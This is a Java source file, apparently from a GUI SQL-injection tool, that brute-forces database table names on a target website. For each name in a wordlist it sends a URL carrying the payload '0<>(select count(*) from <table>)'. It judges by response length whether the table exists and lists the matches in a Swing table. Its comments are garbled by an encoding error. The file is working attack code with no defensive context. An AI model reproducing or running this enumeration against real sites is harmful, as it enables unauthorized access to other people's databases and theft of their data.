package com.sql;

import java.util.List;

import javax.swing.JButton;
import javax.swing.table.DefaultTableModel;

public class GetTableName implements Runnable{
	private String url;
	private String urlHead;
	private String urlEnd;
	private List<String> table;
	private boolean flag=true;
	private JButton parseTableBtn;
	private JButton parseColumnBtn;
	private DefaultTableModel showTable;
	private int contentLen;
	private List<String> tableName;
	public GetTableName(String url,String urlHead,String urlEnd,JButton parseTableBtn,JButton parseColumnBtn,DefaultTableModel showTable,List<String> table,List<String> tableName) {
		// TODO Auto-generated constructor stub
		this.url=url;
		this.urlEnd=urlEnd;
		this.urlHead=urlHead;
		this.parseTableBtn=parseTableBtn;
		this.parseColumnBtn=parseColumnBtn;
		this.showTable=showTable;
		this.table=table;
		this.contentLen=IsExistInjection.getContent(this.url).length();
		this.tableName=tableName;
	}
	@Override
	public void run() {
		int i=0;
		while(i<tableName.size()&&flag==true){// ��ÿһ�������ֵ��еı��������б���������
			if (testTableName(tableName.get(i))){// ���Ըñ����Ƿ����
				table.add(tableName.get(i));// ����������ӵ�������
				Object[] obj={tableName.get(i)};
				showTable.addRow(obj);
			}
			i++;
		}
		parseTableBtn.setText("������");
		if(!table.isEmpty())
			parseColumnBtn.setEnabled(true);
	}
	public boolean testTableName(String tableName) {// ����ÿ�������Ƿ���ȷ
		String testUrl = urlHead + "0<>(select%20count(*)%20from%20"
				+ tableName + ")" + urlEnd;// %20����ո� <>��ʾ������
		try {
			if (IsExistInjection.isRightPage(this.contentLen, testUrl))
				return true;
			else
				return false;
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return false;
		}
	}
	public void stop(){
		flag=false;
	}
}
